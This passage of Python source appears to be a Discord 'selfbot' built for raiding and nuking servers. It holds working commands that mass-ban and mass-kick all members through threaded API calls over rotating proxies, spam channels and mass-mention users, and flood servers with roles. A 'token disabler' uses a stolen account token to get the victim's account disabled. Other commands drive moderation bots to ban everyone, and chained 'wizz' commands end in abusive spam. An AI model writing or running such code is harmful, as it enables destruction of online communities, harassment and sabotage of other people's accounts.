                         }).result()

    try:
        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(target=mass_ban, args=(member.id, )).start()
                logging.info(f"Executed member {member}.")
        clear()
        logging.info("Operation mass ban successful.")
    except Exception as error:
        logging.info("Connection error.")
        sleep(10)




@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(f'{message}\n' * 15)

@client.command(aliases=["enc"])
async def encrypt(ctx,message="woah top quality encryption no one will ever see this im telling u"):
    msg = base64.b64encode(str(message).encode())
    final = str(msg).replace("'","")
    await ctx.message.edit(content=f"{final[1:]}")

@client.command(aliases=['dec'])
async def decrypt(ctx,message="d29haCB0b3AgcXVhbGl0eSBlbmNyeXB0aW9uIG5vIG9uZSB3aWxsIGV2ZXIgc2VlIHRoaXMgaW0gdGVsbGluZyB1"):
    msg = base64.b64decode(str(message).encode())
    final = str(msg).replace("'","")
    await ctx.message.edit(content=f"{final[1:]}")        


@client.command()
async def massroles2(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)
    def massroles2(i):
        json = {
          "name": i
        }
        r = sessions.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
    for i in range(500):
        threading.Thread(
          target=massroles2,
          args=(random.choice(ROLE_NAMES), )
          ).start()
        logging.info(f"Created channel {random.choice(ROLE_NAMES)}.")

    await asyncio.sleep(15)


@client.command(aliases=['disabletoken'])
async def tokendisable(ctx,tokentofrick=None):

    randcolor = random.randint(0x000000, 0xFFFFFF)
    await ctx.message.delete()
    if tokentofrick == None:
        embed=discord.Embed(title="Hx2 Selfbot - Token Disabler", description=f"Supply a token - {prefix.strip()}tokendisable [token-here] ", color=randcolor)
        await ctx.message.edit(content="",embed=embed)


    elif ctx.guild == None:
        embed=discord.Embed(title="Hx2 Selfbot - Token Disabler", description=f"Try do this command in a private server - it has problems in dms (working on fixing)!", color=randcolor)
        await ctx.message.edit(content="",embed=embed)

    else:
        embed=discord.Embed(title="Hx2 Selfbot - Token Disabler", description=f"If your sure you want to disable that token, react.\nDisabling means that the account will be DISABLED - the chances of recovering it are pratically impossible.", color=randcolor)
        message = await ctx.send(embed=embed)        
        await message.add_reaction('✅')
        randcolor = random.randint(0x000000, 0xFFFFFF)
        reactionstuffyes = True
        def requirements(reaction, user):
            return user == ctx.author and str(reaction.emoji) in ('✅') and message==message


        while reactionstuffyes:
            try:
                reaction, user = await client.wait_for('reaction_remove', timeout=10, check=requirements)
                embed=discord.Embed(title="Hx2 Selfbot - Token Disabler", description=f"You reacted, the process has started!\nDisabling token", color=randcolor)
                await message.edit(embed=embed)
                await message.clear_reactions()
                reactionstuffyes = False
                headers={"authorization": tokentofrick} #using just the token as a header = ez disable with things like servers and friend requests

                #this disabler works better then a payload saying theyre underage as its practically impossible to recover the acc

                for i in range(50):
                    requests.post("https://discord.com/api/v8/users/@me/relationships",headers=headers,json={"username":"01","discriminator":1}) #a random name thatll probably always be in demand + theyre probably used to people randomly friending them
                    await asyncio.sleep(1) 
                    requests.delete("https://discord.com/api/v8/users/@me/relationships/213583513780224000",headers=headers) #this way we can keep adding and removing them
                    await asyncio.sleep(1) 
                                              
                                              
                await asyncio.sleep(15) 
                tokendata = requests.get("https://discord.com/api/v8/users/@me",headers=headers)
                randcolor = random.randint(0x000000, 0xFFFFFF)
                if tokendata.status_code != 200:
                    embed=discord.Embed(title="Hx2 Selfbot - Token Disabler", description=f"Token disabled - discord responds with : `{tokendata.text}`", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    await message.edit(embed=embed)           
                else:
                    embed=discord.Embed(title="Hx2 Selfbot - Token Disabler", description=f"Token valid - strange - try again maybe?", color=randcolor)
                    await message.edit(embed=embed)      

            except asyncio.TimeoutError:
                embed=discord.Embed(title="Hx2 Selfbot - Token Disabler", description=f"You took too long - Run this command again if you wish to DISABLE an account", color=randcolor)
                await message.edit(embed=embed)
                await message.clear_reactions()
                reactionstuffyes= False

@client.command(aliases=['exit'])
async def logout(ctx):
    await ctx.message.delete()
    await ctx.send("logging out..", delete_after=0.2)
    await asyncio.sleep(2)
    exit(0)

@client.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  # b'\xfc'
    await ctx.message.delete()
    await client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@client.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        print(list(ctx.guild.members))
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)

@client.command()
async def massban(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Hx2")
        except:
            pass

@client.command()
async def masskick(ctx):
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Hx2r")
        except:
            pass

@client.command(aliases=['kick2'])
async def masskick2(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def mass_kick(i):
        r = sessions.put(f"https://discord.com/api/v9/guilds/{guild}/kick/{i}",
                         headers=headers,
                         proxies={
                             "http": 'http://' + next(rotating)
                         }).result()

    try:
        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(target=mass_kick, args=(member.id, )).start()
                logging.info(f"Executed member {member}.")
        clear()
        logging.info("Operation mass kick successful.")
    except Exception as error:
        logging.info("Connection error.")
        sleep(10)

@client.command()
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@client.command()
async def koyaban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("koya ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)

@client.command()
async def summrsban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send(">ban " + member.mention)
        await ctx.send(".summrsban")
        await message.delete()
        await asyncio.sleep(1.5)

@client.command()
async def zenban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("^ban " + member.mention)
        await ctx.send(".zenban")
        await message.delete()
        await asyncio.sleep(1.5)


@client.command()
async def dynoban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("?ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)

@client.command()
async def vortexban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send(">>ban " + member.mention + member.mention + member.mention + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)

@client.command()
async def wickban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("w!ban " + member.mention)
        await ctx.channel.send(f"y")
        await message.delete()
        await asyncio.sleep(1.5)

@client.command()
async def carlban(ctx):
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send("!ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)

@client.command()
async def massban3(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('Scraped/members.txt')
    except:
        pass

    membercount = 0
    with open('Scraped/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('STARTING BANING ALL PEOPLES IN THIS DISCORD SERVER')
        m.close()
    guild = guild
    print()
    members = open('Scraped/members.txt')
    for member in members:
        while True:
            r = session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"banned{member.strip()}")
                    break
                else:
                    break

    members.close()


@client.command()
async def masskick3(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('Scraped/members.txt')
    except:
        pass

    membercount = 0
    with open('Scraped/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send('STARTING KICKING ALL PEOPLES IN THIS DISCORD SERVER')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = session.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Kicked {member.strip()}")
                    break
                else:
                    break

    members.close()

@client.command ()#line:932
async def restart (OOO0OOOO0OO0000OO ):#line:933
    await OOO0OOOO0OO0000OO .send ("\x52\x65\x73\x74\x61\x72\x74\x69\x6E\x67\x20\x53\x65\x6C\x66\x62\x6F\x74\x2E\x2E\x2E\x2E\x2E\x2E\x2E\x2E")#line:934
    os .system ('python '+sys .argv [0 ])



@client.command(name='firstmessage')
async def _first_message(ctx, channel: discord.TextChannel=None):
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=(first_message.content))
    embed.add_field(name='First Message',
      value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text='Created by Hacker')
    await ctx.send(embed=embed)

@client.command(name='disableCommunityMode', aliases=['dCM', 'dCommunityMode'])
async def disableCommunityMode(ctx):
        r = sessions.patch(f'https://discord.com/api/v9/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})

@client.command()
async def swizz(ctx):
  await ctx.channel.send(f">rr Doxx Papa Bolo ")
  await ctx.channel.send(f">rs Doxx Papa Bolo ")
  await ctx.channel.send(f">rc Doxx Papa Bolo ")

@client.command()
async def bwizz(ctx):
  await ctx.channel.send(f">dynoban ")
  await ctx.channel.send(f">vortexban")
  await ctx.channel.send(f">carlban")
  await ctx.channel.send(f">koyaban")
  
@client.command()
async def pwizz(ctx):
  await ctx.channel.send(f">mcat ")
  await ctx.channel.send(f">mvc")
  await ctx.channel.send(f">masschanels2")
  await ctx.channel.send(f">scrape")
  await ctx.channel.send(f">massban2")
  await ctx.channel.send(f">bwizz")
  await ctxchannel.send(f">massban3")
  await ctx.channel.send(f">pings")
  await ctx.channel.send(f">spam 100 @everyone @here ht madar chod xo and hackz was here")
  

client.run(token, bot=False)
